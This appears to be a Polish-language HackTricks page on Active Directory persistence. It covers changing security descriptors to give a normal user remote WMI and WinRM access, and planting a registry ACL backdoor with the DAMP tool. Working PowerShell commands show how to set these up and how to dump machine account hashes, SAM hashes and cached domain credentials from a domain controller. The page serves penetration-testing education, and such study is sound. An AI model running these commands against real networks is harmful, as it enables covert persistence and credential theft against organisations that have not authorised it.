# Deskryptory zabezpieczeń

{{#include ../../banners/hacktricks-training.md}}

## Deskryptory zabezpieczeń

[Z dokumentacji](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) definiuje format używany do opisywania deskryptora zabezpieczeń. SDDL używa ciągów ACE dla DACL i SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, które **obiekt** ma **względem** **obiektu**. Jeśli możesz po prostu dokonać **niewielkiej zmiany** w **deskryptorze zabezpieczeń** obiektu, możesz uzyskać bardzo interesujące uprawnienia względem tego obiektu bez konieczności bycia członkiem uprzywilejowanej grupy.

Ta technika persistence opiera się więc na możliwości uzyskania wszystkich wymaganych uprawnień względem określonych obiektów, aby móc wykonać zadanie, które zwykle wymaga uprawnień administratora, ale bez konieczności bycia administratorem.

### Dostęp do WMI

Możesz nadać użytkownikowi dostęp do **zdalnego wykonywania WMI** [**za pomocą tego**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Dostęp do WinRM

Zapewnij użytkownikowi dostęp do **konsoli PS przez WinRM** [**za pomocą tego**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Zdalny dostęp do hashy

Uzyskaj dostęp do **registry** i **dump hashes**, tworząc **Reg backdoor za pomocą** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** aby w dowolnym momencie pobierać **hash komputera**, **SAM** oraz wszelkie **cached AD credentials** zapisane na komputerze. Jest to więc bardzo przydatne, aby nadać to uprawnienie **zwykłemu użytkownikowi wobec komputera Domain Controller**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Sprawdź [**Silver Tickets**](silver-ticket.md), aby dowiedzieć się, jak można wykorzystać hash konta komputera kontrolera domeny.

## Odnośniki

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
